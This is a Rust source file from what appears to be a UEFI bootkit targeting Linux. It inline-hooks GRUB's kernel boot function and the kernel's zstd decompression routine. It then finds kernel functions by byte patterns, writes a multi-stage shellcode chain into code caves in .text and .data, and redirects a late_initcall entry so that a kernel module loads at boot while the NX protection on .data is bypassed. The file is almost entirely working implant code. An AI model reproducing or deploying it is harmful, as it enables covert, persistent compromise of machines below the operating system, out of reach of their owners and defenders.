use log::{debug, error, info};

use crate::helpers::{
    file_helper::{cave_finder_by_section_name, cave_finder_by_section_name_after},
    memory_helper::{
        INLINE_HOOK_SIZE, InitcallPhase, InlineHook, ZSTD_DECOMPRESS_FUNC_SIGNATURE, binary_search,
        get_initcall_phase_address, inline_jump_hook, restore_inline_hook,
        translate_physical_to_virtual,
    },
};

pub static mut GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE: InlineHook = InlineHook {
    target: 0,
    hook: 0,
    original_bytes: [0; INLINE_HOOK_SIZE],
};

pub static mut ZSTD_DECOMPRESS_DCTX_HOOK_INLINE: InlineHook = InlineHook {
    target: 0,
    hook: 0,
    original_bytes: [0; INLINE_HOOK_SIZE],
};

const REQUEST_MODULE_PATTERN: &[u8] = &[0x65, 0x48, 0x8B, 0x05, 0xAB, 0x95];
const REQUEST_MODULE_DISTANCE: u8 = 0x45;
const SET_MEMORY_X_PATTERN: &[u8] = &[0x31, 0xC0, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x08];
const SET_MEMORY_X_DISTANCE: u8 = 6;
const CAVE_PAGE_DISP_SENTINEL: u32 = 0x11223344;
const SET_MEMORY_X_REL_SENTINEL: u32 = 0x55667788;
const LOADER_JMP_REL_SENTINEL: u32 = 0x99AABBCC;
const REQUEST_MODULE_REL_SENTINEL: u32 = 0xDDEEFF00;
const ORIGINAL_FN_REL_SENTINEL: u32 = 0x12345678;
const SCHEDULE_WORK_PATTERN: &[u8] = &[0x48, 0x89, 0xFA, 0xBF, 0x00, 0x20, 0x00, 0x00];
const SCHEDULE_WORK_DISTANCE: u8 = 8;
const MSLEEP_PATTERN: &[u8] = &[0x48, 0x89, 0xC3, 0x66, 0x90, 0x41, 0xC7, 0x44, 0x24, 0x18, 0x02];
const MSLEEP_DISTANCE: u8 = 0x1E;
const SCHEDULE_WORK_REL_SENTINEL: u32 = 0xAABBCCDD;
const MSLEEP_REL_SENTINEL: u32 = 0x11AABBCC;
const LKM_WORKER_REL_SENTINEL: u32 = 0xFEDCBA98;
const WORKER_RESUME_SENTINEL: u32 = 0x11EEDDFF;
// Offset of lkm_worker from the start of the loader blob (set by align 128 in lkm_loader.asm).
const LKM_WORKER_IN_LOADER_OFFSET: usize = 128;

/// grub_arch_efi_linux_boot_image_hook is an inline hook for the GRUB function responsible for loading Linux boot images on EFI systems.
/// It restores the original function before executing it to ensure stability, and hooking the Linux kernel.
///
/// # Arguments
/// - `kernel_entry`: The entry point of the Linux kernel.
/// - `kernel_size`: The size of the Linux kernel.
/// - `args`: Additional arguments passed to the original function.
///
/// # Returns
/// - `i32`: The return value from the original function, or -1 if an error occurs.
pub extern "C" fn grub_arch_efi_linux_boot_image_hook(
    kernel_entry: usize,
    kernel_size: usize,
    args: *const u8,
) -> i32 {
    let original_fn_addr: usize;
    let real_kernel_entry: usize;
    unsafe {
        core::arch::asm!(
            "mov {}, rax",
            out(reg) original_fn_addr,
            options(nomem, nostack, preserves_flags)
        );
        core::arch::asm!(
            "mov {}, r12",
            out(reg) real_kernel_entry,
            options(nomem, nostack, preserves_flags)
        );
    }

    debug!(
        "grub_arch_efi_linux_boot_image_hook called with kernel_entry: {:#x}, kernel_size: {:#x}, args: {:#x}",
        real_kernel_entry, kernel_size, args as usize
    );

    // Snapshot hook state once so restore/jump use the same values.
    let mut target = unsafe {
        core::ptr::addr_of!(GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE.target).read_volatile()
    };
    let original_bytes = unsafe {
        core::ptr::addr_of!(GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE.original_bytes)
            .read_volatile()
    };

    if target == 0 {
        error!("Hook target was not initialized");
        return -1;
    }

    if original_fn_addr == 0 {
        error!("Original function address was not preserved");
        return -1;
    }

    if let Err(e) = restore_inline_hook(target, &original_bytes) {
        error!("Failed to restore original function: {:?}", e);
        return -1;
    }

    let original_fn: extern "C" fn(usize, usize, *const u8) -> i32 =
        unsafe { core::mem::transmute(original_fn_addr) };

    // Finding zstd_decompress_dctx in vmlinuz.
    target = match binary_search(
        real_kernel_entry as usize,
        kernel_size as usize,
        ZSTD_DECOMPRESS_FUNC_SIGNATURE,
    ) {
        Some(addr) => addr,
        None => {
            error!("Failed to find target function in original GRUB");

            return original_fn(kernel_entry, kernel_size, args);
        }
    };

    if target == 0 {
        error!("Failed to find target function in original GRUB");

        return original_fn(kernel_entry, kernel_size, args);
    }
    debug!("Found target function at address: {:#x}", target);

    // Hooking vmlinuz's decompression functions.
    let vmlinuz_hook = zstd_decompress_dctx_hook as *const () as usize;
    let hook_info = match inline_jump_hook(target, vmlinuz_hook) {
        Ok(info) => info,
        Err(e) => {
            error!("Failed to install inline hook, reason {:?}", e);

            return original_fn(kernel_entry, kernel_size, args);
        }
    };
    unsafe {
        ZSTD_DECOMPRESS_DCTX_HOOK_INLINE = hook_info;
    }
    debug!(
        "Installed zstd_decompress_dctx_hook at address: {:#x}",
        vmlinuz_hook
    );

    // Call the original callee that was held in rax at the patched call site.
    original_fn(kernel_entry, kernel_size, args)
}

/// zstd_decompress_dctx_hook is an inline hook for the zstd_decompress_dctx function in the Linux kernel.
///
/// # Arguments:
/// - `dctx`: The decompression context.
/// - `dst`: The destination buffer for the decompressed data.
/// - `dst_capacity`: The capacity of the destination buffer.
/// - `src`: The source buffer containing the compressed data.
/// - `src_size`: The size of the source buffer.
///
/// # Returns:
/// - `isize`: The return value from the original function, or -1 if an error occurs.
pub extern "sysv64" fn zstd_decompress_dctx_hook(
    dctx: usize,
    dst: usize,
    dst_capacity: usize,
    src: usize,
    src_size: usize,
) -> isize {
    debug!(
        "zstd_decompress_dctx_hook called with dctx: {:#x}, dst: {:#x}, dst_capacity: {:#x}, src: {:#x}, src_size: {:#x}",
        dctx, dst, dst_capacity, src, src_size
    );

    let target =
        unsafe { core::ptr::addr_of!(ZSTD_DECOMPRESS_DCTX_HOOK_INLINE.target).read_volatile() };
    let original_bytes = unsafe {
        core::ptr::addr_of!(ZSTD_DECOMPRESS_DCTX_HOOK_INLINE.original_bytes).read_volatile()
    };
    if target == 0 {
        error!("Hook target was not initialized");

        return -1;
    }
    if let Err(e) = restore_inline_hook(target, &original_bytes) {
        error!("Failed to restore original function: {:?}", e);
        return -1;
    }
    let original_fn: extern "sysv64" fn(usize, usize, usize, usize, usize) -> isize =
        unsafe { core::mem::transmute(target) };
    let ret_val = original_fn(dctx, dst, dst_capacity, src, src_size);

    debug!(
        "zstd_decompress_dctx state is now: dctx: {:#x}, dst: {:#x}, dst_capacity: {:#x}, src: {:#x}, src_size: {:#x}",
        dctx, dst, dst_capacity, src, src_size
    );
    info!(
        "Decompressed linux kernel is at address: {:#x}, size: {:#x}",
        dst, dst_capacity
    );

    // Deploy the kernel hook: overwrite the late_initcall slot to point at our
    // shellcode in the code cave, which calls __request_module then tail-calls
    // the original initcall target.
    let initcall_info =
        match get_initcall_phase_address(dst, dst_capacity, InitcallPhase::LateInitcall) {
            Some(info) => info,
            None => {
                error!("Failed to find late_initcall address in kernel");
                return ret_val;
            }
        };
    debug!(
        "Found late_initcall entry: entry_phys={:#x}, entry_virt={:#x}, original_target_virt={:#x}",
        initcall_info.entry_physical_address,
        initcall_info.entry_virtual_address,
        initcall_info.original_target_virtual_address
    );

    // Stage 1 — stager lives in .text (always RX): makes .data cave executable, jumps to loader.
    // Stage 2 — loader lives in .data: initialises work_struct, calls schedule_work.
    // Stage 3 — worker_resume lives in .text (always RX): re-enables .data execution, jumps to lkm_worker.
    // Stage 4 — lkm_worker lives in .data (inside loader blob at offset LKM_WORKER_IN_LOADER_OFFSET).
    //            mark_readonly() re-applies NX to .data after initcalls; worker_resume fixes this.
    const STAGER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_STAGER_BIN"));
    const STAGER_LEN: usize = STAGER_TEMPLATE.len();
    const LOADER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_LOADER_BIN"));
    const LOADER_LEN: usize = LOADER_TEMPLATE.len();
    const WORKER_RESUME_TEMPLATE: &[u8] = include_bytes!(env!("LKM_WORKER_RESUME_BIN"));
    const WORKER_RESUME_LEN: usize = WORKER_RESUME_TEMPLATE.len();

    // Find stager cave in .text.
    let stager_cave = match cave_finder_by_section_name(dst, dst_capacity, STAGER_LEN, ".text") {
        Some(addr) => addr,
        None => {
            error!("Failed to find stager cave in .text");
            return ret_val;
        }
    };
    debug!("Stager cave: phys={:#x}", stager_cave);

    // Find worker_resume cave in .text — must be after the stager cave.
    let worker_resume_cave = match cave_finder_by_section_name_after(
        dst,
        dst_capacity,
        WORKER_RESUME_LEN,
        ".text",
        stager_cave + STAGER_LEN,
    ) {
        Some(addr) => addr,
        None => {
            error!("Failed to find worker_resume cave in .text");
            return ret_val;
        }
    };
    debug!("Worker resume cave: phys={:#x}", worker_resume_cave);

    // Find loader cave in .data.
    let loader_cave = match cave_finder_by_section_name(dst, dst_capacity, LOADER_LEN, ".data") {
        Some(addr) => addr,
        None => {
            error!("Failed to find loader cave in .data");
            return ret_val;
        }
    };
    debug!("Loader cave: phys={:#x}", loader_cave);

    // Find __request_module via byte pattern.
    let mut request_module_phys = match binary_search(dst, dst_capacity, REQUEST_MODULE_PATTERN) {
        Some(addr) => addr,
        None => {
            error!("Failed to find __request_module in kernel");
            return ret_val;
        }
    };
    request_module_phys -= REQUEST_MODULE_DISTANCE as usize;
    let request_module_virt =
        match translate_physical_to_virtual(dst, dst_capacity, request_module_phys) {
            Some(addr) => addr,
            None => {
                error!("Failed to translate __request_module to virtual address");
                return ret_val;
            }
        };
    debug!(
        "__request_module: phys={:#x}, virt={:#x}",
        request_module_phys, request_module_virt
    );

    // Find set_memory_x via __ksymtab.
    let mut set_memory_x_phys = match binary_search(dst, dst_capacity, SET_MEMORY_X_PATTERN) {
        Some(addr) => addr,
        None => {
            error!("Failed to find set_memory_x");
            return ret_val;
        }
    };
    set_memory_x_phys -= SET_MEMORY_X_DISTANCE as usize;
    let set_memory_x_virt = match translate_physical_to_virtual(dst, dst_capacity, set_memory_x_phys) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate set_memory_x to virtual address");
            return ret_val;
        }
    };
    debug!(
        "set_memory_x: phys={:#x}, virt={:#x}",
        set_memory_x_phys, set_memory_x_virt
    );

    // Find schedule_work via byte pattern.
    let mut schedule_work_phys =
        match binary_search(dst, dst_capacity, SCHEDULE_WORK_PATTERN) {
            Some(addr) => addr,
            None => {
                error!("Failed to find schedule_work in kernel");
                return ret_val;
            }
        };
    schedule_work_phys -= SCHEDULE_WORK_DISTANCE as usize;
    let schedule_work_virt =
        match translate_physical_to_virtual(dst, dst_capacity, schedule_work_phys) {
            Some(addr) => addr,
            None => {
                error!("Failed to translate schedule_work to virtual address");
                return ret_val;
            }
        };
    debug!(
        "schedule_work: phys={:#x}, virt={:#x}",
        schedule_work_phys, schedule_work_virt
    );

    // Find msleep via byte pattern.
    let mut msleep_phys = match binary_search(dst, dst_capacity, MSLEEP_PATTERN) {
        Some(addr) => addr,
        None => {
            error!("Failed to find msleep in kernel");
            return ret_val;
        }
    };
    msleep_phys -= MSLEEP_DISTANCE as usize;
    let msleep_virt = match translate_physical_to_virtual(dst, dst_capacity, msleep_phys) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate msleep to virtual address");
            return ret_val;
        }
    };
    debug!(
        "msleep: phys={:#x}, virt={:#x}",
        msleep_phys, msleep_virt
    );

    let stager_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, stager_cave) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate stager cave to virtual address");
            return ret_val;
        }
    };
    debug!(
        "Stager cave: phys={:#x}, virt={:#x}",
        stager_cave, stager_cave_virt
    );

    let worker_resume_cave_virt =
        match translate_physical_to_virtual(dst, dst_capacity, worker_resume_cave) {
            Some(addr) => addr,
            None => {
                error!("Failed to translate worker_resume cave to virtual address");
                return ret_val;
            }
        };
    debug!(
        "Worker resume cave: phys={:#x}, virt={:#x}",
        worker_resume_cave, worker_resume_cave_virt
    );

    let loader_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, loader_cave) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate loader cave to virtual address");
            return ret_val;
        }
    };
    debug!(
        "Loader cave: phys={:#x}, virt={:#x}",
        loader_cave, loader_cave_virt
    );

    // lkm_worker is at a fixed offset inside the loader blob (set by align 128 in lkm_loader.asm).
    let lkm_worker_virt = loader_cave_virt + LKM_WORKER_IN_LOADER_OFFSET;

    // ── Patch stager blob ──────────────────────────────────────────────────────
    let mut stager = [0u8; STAGER_LEN];
    stager.copy_from_slice(STAGER_TEMPLATE);

    // disp32 in `lea rdi, [rip + disp32]`: rip-after = stager_cave_virt + off + 4
    let sentinel = CAVE_PAGE_DISP_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
        let disp32 = (loader_cave_virt as i64) - (stager_cave_virt as i64 + off as i64 + 4);
        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
            error!("Loader cave too far from stager for disp32: delta={:#x}", disp32);
            return ret_val;
        }
        stager[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
    } else {
        error!("Failed to find CAVE_PAGE_DISP_SENTINEL in stager");
        return ret_val;
    }

    let sentinel = SET_MEMORY_X_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
        let rel32 = (set_memory_x_virt as i64) - (stager_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!("set_memory_x too far from stager for rel32: delta={:#x}", rel32);
            return ret_val;
        }
        stager[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find SET_MEMORY_X_REL_SENTINEL in stager");
        return ret_val;
    }

    let sentinel = LOADER_JMP_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
        let rel32 = (loader_cave_virt as i64) - (stager_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!("Loader cave too far from stager for rel32: delta={:#x}", rel32);
            return ret_val;
        }
        stager[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find LOADER_JMP_REL_SENTINEL in stager");
        return ret_val;
    }

    // ── Patch loader blob ──────────────────────────────────────────────────────
    let mut loader = [0u8; LOADER_LEN];
    loader.copy_from_slice(LOADER_TEMPLATE);

    let sentinel = REQUEST_MODULE_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
        let rel32 = (request_module_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!("__request_module too far from loader cave for rel32: delta={:#x}", rel32);
            return ret_val;
        }
        loader[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find REQUEST_MODULE_REL_SENTINEL in loader");
        return ret_val;
    }

    let sentinel = ORIGINAL_FN_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
        let rel32 = (initcall_info.original_target_virtual_address as i64)
            - (loader_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!("Original initcall too far from loader cave for rel32: delta={:#x}", rel32);
            return ret_val;
        }
        loader[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find ORIGINAL_FN_REL_SENTINEL in loader");
        return ret_val;
    }

    // ── Patch loader blob ──────────────────────────────────────────────────────
    let sentinel = SCHEDULE_WORK_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
        let rel32 =
            (schedule_work_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!(
                "schedule_work too far from loader cave for rel32: delta={:#x}",
                rel32
            );
            return ret_val;
        }
        loader[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find SCHEDULE_WORK_REL_SENTINEL in loader");
        return ret_val;
    }

    let sentinel = MSLEEP_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
        let rel32 = (msleep_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!(
                "msleep too far from loader cave for rel32: delta={:#x}",
                rel32
            );
            return ret_val;
        }
        loader[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find MSLEEP_REL_SENTINEL in loader");
        return ret_val;
    }

    // WORKER_RESUME_SENTINEL: disp32 in `lea rax, [rip + disp32]` — points to
    // lkm_worker_resume in .text so that work.func runs from an always-executable page.
    let sentinel = WORKER_RESUME_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
        let disp32 =
            (worker_resume_cave_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
            error!(
                "worker_resume cave too far from loader for disp32: delta={:#x}",
                disp32
            );
            return ret_val;
        }
        loader[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
    } else {
        error!("Failed to find WORKER_RESUME_SENTINEL in loader");
        return ret_val;
    }

    // ── Patch worker_resume blob ───────────────────────────────────────────────
    let mut worker_resume = [0u8; WORKER_RESUME_LEN];
    worker_resume.copy_from_slice(WORKER_RESUME_TEMPLATE);

    // CAVE_PAGE_DISP_SENTINEL: disp32 in lea rdi,[rip+d] → loader_cave_virt
    let sentinel = CAVE_PAGE_DISP_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&worker_resume, &sentinel) {
        let disp32 =
            (loader_cave_virt as i64) - (worker_resume_cave_virt as i64 + off as i64 + 4);
        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
            error!(
                "Loader cave too far from worker_resume for disp32: delta={:#x}",
                disp32
            );
            return ret_val;
        }
        worker_resume[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
    } else {
        error!("Failed to find CAVE_PAGE_DISP_SENTINEL in worker_resume");
        return ret_val;
    }

    // SET_MEMORY_X_REL_SENTINEL: rel32 for call set_memory_x
    let sentinel = SET_MEMORY_X_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&worker_resume, &sentinel) {
        let rel32 =
            (set_memory_x_virt as i64) - (worker_resume_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!(
                "set_memory_x too far from worker_resume for rel32: delta={:#x}",
                rel32
            );
            return ret_val;
        }
        worker_resume[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find SET_MEMORY_X_REL_SENTINEL in worker_resume");
        return ret_val;
    }

    // LKM_WORKER_REL_SENTINEL: rel32 for jmp lkm_worker in .data
    let sentinel = LKM_WORKER_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&worker_resume, &sentinel) {
        let rel32 =
            (lkm_worker_virt as i64) - (worker_resume_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!(
                "lkm_worker too far from worker_resume for rel32: delta={:#x}",
                rel32
            );
            return ret_val;
        }
        worker_resume[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find LKM_WORKER_REL_SENTINEL in worker_resume");
        return ret_val;
    }

    // ── Write all three blobs ──────────────────────────────────────────────────
    unsafe {
        core::ptr::copy_nonoverlapping(stager.as_ptr(), stager_cave as *mut u8, STAGER_LEN);
        core::ptr::copy_nonoverlapping(loader.as_ptr(), loader_cave as *mut u8, LOADER_LEN);
        core::ptr::copy_nonoverlapping(
            worker_resume.as_ptr(),
            worker_resume_cave as *mut u8,
            WORKER_RESUME_LEN,
        );
    }
    debug!(
        "Wrote {} bytes of stager to {:#x}, {} bytes of loader to {:#x}, {} bytes of worker_resume to {:#x}",
        STAGER_LEN, stager_cave, LOADER_LEN, loader_cave, WORKER_RESUME_LEN, worker_resume_cave
    );

    // ── Patch initcall slot (prel32) to point at the stager ────────────────────
    let relative_offset = (stager_cave_virt as i64) - (initcall_info.entry_virtual_address as i64);
    if relative_offset < i32::MIN as i64 || relative_offset > i32::MAX as i64 {
        error!(
            "Stager cave too far from initcall entry for prel32: delta={:#x}",
            relative_offset
        );
        return ret_val;
    }
    unsafe {
        core::ptr::write(
            initcall_info.entry_physical_address as *mut i32,
            relative_offset as i32,
        );
    }
    info!(
        "Patched late_initcall entry at virt={:#x} (phys={:#x}) prel32={} -> stager at virt={:#x}",
        initcall_info.entry_virtual_address,
        initcall_info.entry_physical_address,
        relative_offset as i32,
        stager_cave_virt
    );

    ret_val
}

/// Finds the byte offset of a 4-byte sentinel value within a buffer.
fn find_sentinel_4(buf: &[u8], sentinel: &[u8; 4]) -> Option<usize> {
    buf.windows(4).position(|w| w == sentinel)
}
